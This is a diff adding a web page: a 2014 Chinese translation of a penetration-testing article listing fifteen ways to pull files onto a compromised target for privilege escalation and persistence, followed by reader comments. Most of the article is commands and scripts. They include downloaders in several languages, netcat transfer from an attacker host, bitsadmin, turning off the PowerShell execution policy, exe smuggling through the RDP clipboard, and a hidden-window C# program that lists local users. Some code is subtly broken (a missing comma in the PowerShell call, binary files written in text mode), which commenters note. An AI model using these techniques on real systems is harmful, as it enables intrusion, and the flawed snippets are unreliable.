@@ -1,0 +1,77 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">下载文件的15种方法</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">爱小狐狸的小螃蟹</a> <span class="bull">·</span> <time title="2014/06/19 18:19" ui-time="" datetime="2014/06/19 18:19" class="published ng-binding ng-isolate-scope">2014/06/19 18:19</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from:https://www.netspi.com/blog/entryid/231/15-ways-to-download-a-file</p><p>在我们的入侵过程中，通常会需要向目标主机传送一些文件，来达到提权，维持控制等目的。这篇blog列举了15种下载文件的方法。</p><p>当然还有许多其它的办法来上传文件，下面的列表是15个我比较喜欢使用的技巧。</p><h3>PowerShell File Download</h3><p>PowerShell 是一种winodws原生的脚本语言，对于熟练使用它的人来说，可以实现很多复杂的功能。</p><p>在windows 2003之中默认支持这种脚本。</p><p>下面这两条指令实现了从Internet网络下载一个文件。</p><pre><code>$p = New-Object System.Net.WebClient
+$p.DownloadFile("http://domain/file" "C:\%homepath%\file")
+</code></pre><p>下面这条指令是执行一个文件</p><pre><code>PS C:\&gt; .\test.ps1
+</code></pre><p>有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。</p><pre><code>C:\&gt;powershell set-executionpolicy unrestricted
+</code></pre><h3>Visual Basic File Download</h3><p>在1998年Visual Basic最终标准在windows上确定。下面的代码可以实现下载文件，虽然它的长度比Powershell长多了。</p><pre><code>Set args = Wscript.Arguments
+Url = "http://domain/file"
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", Url, False
+xHttp.Send
+with bStrm
+    .type = 1 '
+    .open
+    .write xHttp.responseBody
+    .savetofile " C:\%homepath%\file", 2 '
+end with
+</code></pre><p>在windows中Cscript指令可以允许你执行VBS脚本文件或者对script脚本做一些设置。在windows 7中这个指令并不是必须要用到。 但是在windows XP中需要使用这条指令，如下所示。</p><p>C:>cscript test.vbs</p><p>以下四种语言都不是系统原生脚本，但是如果你的目标机器安装了这些语言，你就可以使用他们来下载文件。</p><h3>Perl File Download</h3><p>Perl是一门很吊的语言，使用它基本可以实现任何事情，用它实现文件下载也很简单。</p><pre><code>#!perl
+#!/usr/bin/perl
+use LWP::Simple;
+getstore("http://domain/file", "file");
+</code></pre><p>执行脚本文件是这样</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c8baa7a7bc88a3a9a4a1">[email&#160;protected]</a>:~# perl test.pl
+</code></pre><h3>Python File Download</h3><p>Python也是很受欢迎的主流脚本语言，代码清晰且简洁。</p><pre><code>#!python
+#!/usr/bin/python
+import urllib2
+u = urllib2.urlopen('http://domain/file')
+localFile = open('local_file', 'w')
+localFile.write(u.read())
+localFile.close()
+</code></pre><p>执行脚本文件是这样</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4d3f2222390d262c2124">[email&#160;protected]</a>:~# python test.py
+</code></pre><h3>Ruby File Download</h3><p>Ruby是一个面对对象的语言，Metasploit框架就是用它来实现的，当然他也可以实现像下载文件这样的小任务。</p><pre><code>#!ruby
+#!/usr/bin/ruby
+require 'net/http'
+Net::HTTP.start("www.domain.com") { |http|
+r = http.get("/file")
+open("save_location", "wb") { |file|
+file.write(r.body)
+}
+}
+</code></pre><p>执行脚本文件是这样</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f1839e9e85b19a909d98">[email&#160;protected]</a>:~# ruby test.rb
+</code></pre><h3>PHP File Download</h3><p>PHP作为一种服务端脚本，也可以实现下载文件这种功能。</p><pre><code>#!/usr/bin/php
+&lt;?php
+        $data = @file("http://example.com/file");
+        $lf = "local_file";
+        $fh = fopen($lf, 'w');
+        fwrite($fh, $data[0]);
+        fclose($fh);
+?&gt;
+</code></pre><p>执行脚本文件是这样</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fc8e939388bc979d9095">[email&#160;protected]</a>:~# php test.php
+</code></pre><p>下面的上传文件的方法，可能需要更多得步骤，但是有些情况下却可以绕过去多限制。</p><h3>FTP File Download</h3><p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p><pre><code>ftp 127.0.0.1
+username
+password
+get file
+exit
+</code></pre><h3>TFTP File Download</h3><p>在Windows Vista以及以后的版本中默认有FTP，可以使用以下命令运行：</p><pre><code>tftp -i host GET C:\%homepath%\file location_of_file_on_tftp_server
+</code></pre><h3>Bitsadmin File Download</h3><p>Bitsadmin是Windows命令行工具，用户可以使用它来创建下载或上传的任务。</p><pre><code>bitsadmin /transfer n http://domain/file c:\%homepath%\file
+</code></pre><h3>Wget File Download</h3><p>Wget是Linux和Windows下的一个工具，允许非交互下载。</p><pre><code>wget http://example.com/file
+</code></pre><h3>Netcat File Download</h3><p>Netcat在linux上的实例：</p><p>攻击者的电脑上输入：</p><pre><code>cat file | nc -l 1234
+</code></pre><p>这个命令会将file的内容输出到本地的1234端口中，然后不论谁连接此端口，file的内容将会发送到连接过来的IP。</p><p>目标电脑上的命令：</p><pre><code>nc host_ip 1234 &gt; file
+</code></pre><p>这条命令将连接攻击者的电脑，接受file内容保存。</p><h3>Windows Share File Download</h3><p>Windows shares可以加载一个驱动器，然后用命令来复制文件。</p><p>加载远程驱动：</p><pre><code> net use x: \\127.0.0.1\share /user:example.com\userID myPassword
+</code></pre><h3>Notepad Dialog Box File Download</h3><p>如果你有权限接入一台（远程连接或者物理机）电脑，但是你用户权限不允许打开浏览器，这种方式可以让你快速的从一个URL或者UNC路径当中下载文件。</p><p>1.打开notepad 2.点击file - open</p><p>在File Name当中输入完整的URL：</p><p><img alt="enter image description here" img-src="d16518f51c8aa8ff2e7cec95749f2759701c7752.jpg"></p><p>Notepad将会获取URL的内容展现出来。</p><h3>Exe to Txt, and Txt to Exe with PowerShell and Nishang</h3><p>http://code.google.com/p/nishang/downloads/list</p><p>当需要把一个exe文件放到目标计算机上时，这可能是我最喜欢的工具，Nishang使用PowerShell允许你吧一个exe转换成hex，然后吧hex再转换成原来的exe文件。</p><p>把exe转成hex文件输入：</p><pre><code>PS &gt; .\ExetoText.ps1 evil.exe evil.txt
+</code></pre><p>打开evil.txt文件，复制内容，然后通过RDP的剪贴板复制进目标计算机。</p><p>把hex文件还原成exe文件输入：</p><pre><code>PS &gt; .\TexttoExe.ps1 evil.text evil.exe
+</code></pre><h3>Csc.exe to Compile Source from a File</h3><p>C的编译器（CSC）是包含在在Windows微软.NET安装中的命令行编译器。</p><p>这个可执行文件的默认位置是以下情况：</p><pre><code>C:\Windows\Microsoft.NET\Framework\version
+</code></pre><p>使用下面的示例代码，编译后的可执行文件将使用的cmd.exe来查询本地用户，然后将结果写入一个在C:\Temp\users.txt中。可以修改其中的代码，达到自己想要的目的，然后编译成exe文件。</p><pre><code>public class Evil
+{
+   public static void Main()
+   {
+      System.Diagnostics.Process process = new System.Diagnostics.Process();
+      System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+      startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+      startInfo.FileName = "cmd.exe";
+      startInfo.Arguments = "/C net users &gt; C:\\Temp\\users.txt";
+      process.StartInfo = startInfo;
+      process.Start();
+   }
+}
+</code></pre><p>代码编译命令：</p><pre><code>csc.exe /out:C:\evil\evil.exe C:\evil\evil.cs
+</code></pre><h3>Wrap up</h3><p>希望这篇blog对你有所帮助。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/5253" rel="bookmark" id="re1">劫持SSH会话注入端口转发</a></li><li><a href="http://drops.wooyun.org/tips/9947" rel="bookmark" id="re2">Javascript缓存投毒学习与实战</a></li><li><a href="http://drops.wooyun.org/tips/783" rel="bookmark" id="re3">远程备份数据库和文件的方法</a></li><li><a href="http://drops.wooyun.org/tips/3827" rel="bookmark" id="re4">PHP文件包含漏洞总结</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">asdasd</span> <span class="reply-time">2016-01-10 22:42:12</span></div><p></p><p>powershell的显示语法错误这是为什么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Izual_Yang</span> <span class="reply-time">2015-10-25 23:07:37</span></div><p></p><p>notepad那种方法也需要系统里有ie的吧，不然我怀疑能否解析url</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-03-25 20:09:19</span></div><p></p><p>哈哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">phith0n</span> <span class="reply-time">2015-03-25 18:53:32</span></div><p></p><p>#!/usr/bin/python<br>import urllib2<br>u = urllib2.urlopen(&#039;http://domain/file&#039;)<br>localFile = open(&#039;local_file&#039;, &#039;w&#039;)<br>localFile.write(u.read())<br>localFile.close()</p><p>没见过下载文件用w不用wb的啊！！！<br>坑死了，我说下的exe怎么执行不了，早知道不偷懒自己写一个了！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">webaor16833</span> <span class="reply-time">2015-01-16 00:38:56</span></div><p></p><p>大家好，我是新手，请多多指教，</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">My5t3ry</span> <span class="reply-time">2014-09-08 00:34:09</span></div><p></p><p>赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">z7y</span> <span class="reply-time">2014-09-06 23:01:08</span></div><p></p><p>还有cscript</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzR</span> <span class="reply-time">2014-07-04 17:12:47</span></div><p></p><p>get</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wget</span> <span class="reply-time">2014-06-28 10:37:20</span></div><p></p><p>wget 命令</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Jea</span> <span class="reply-time">2014-06-25 11:03:06</span></div><p></p><p>sh呢...Linux自带的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SinCoder</span> <span class="reply-time">2014-06-24 16:41:47</span></div><p></p><p>php 不应该是更简单的 file_get_contents('http://xx.com/1.exe');</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">踩花大盗</span> <span class="reply-time">2014-06-23 17:38:11</span></div><p></p><p>上传到服务器和从服务器下载是不同的啊，他说的是从服务器下载。比如我入侵了一个别人的服务器，但我没有上传的权限，那或许可以利用服务器的下载来达到同样的效果。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">带馅儿馒头</span> <span class="reply-time">2014-06-21 11:46:18</span></div><p></p><p>支持</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Bloodwolf</span> <span class="reply-time">2014-06-21 09:49:44</span></div><p></p><p>没写文件的权限，只有个空shell，再上传？都是白扯</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-06-21 03:21:31</span></div><p></p><p>以下四种语言都不是系统原生脚本，但是如果你的目标机器安装了这些语言...翻译成安装了这些语言不合适吧...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">索马里的海贼</span> <span class="reply-time">2014-06-20 19:21:31</span></div><p></p><p>把exe转成hex文件输入：</p><p>PS &gt; .\ExetoText.ps1 evil.exe evil.txt<br>打开evil.txt文件，复制内容，然后通过RDP的剪贴板复制进目标计算机。</p><p>把hex文件还原成exe文件输入：</p><p>PS &gt; .\TexttoExe.ps1 evil.text evil.exe</p><p>这个略扯。。。。不是说exe转hex。。。而是弄到目标上的方法</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2014-06-20 13:52:51</span></div><p></p><p>不错，收集了这么多代码也不容易。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">fuckxxoo</span> <span class="reply-time">2014-06-20 10:01:07</span></div><p></p><p>这个，要是把每一种脚本语言都写出来，不止50种了吧？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">#</span> <span class="reply-time">2014-06-20 08:36:34</span></div><p></p><p>到底你说的是上传还是下载啊，欺负我没文化。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">juuxdd</span> <span class="reply-time">2014-06-20 08:30:19</span></div><p></p><p>学习了！</p><p></p></div></div></div></div></div></main>
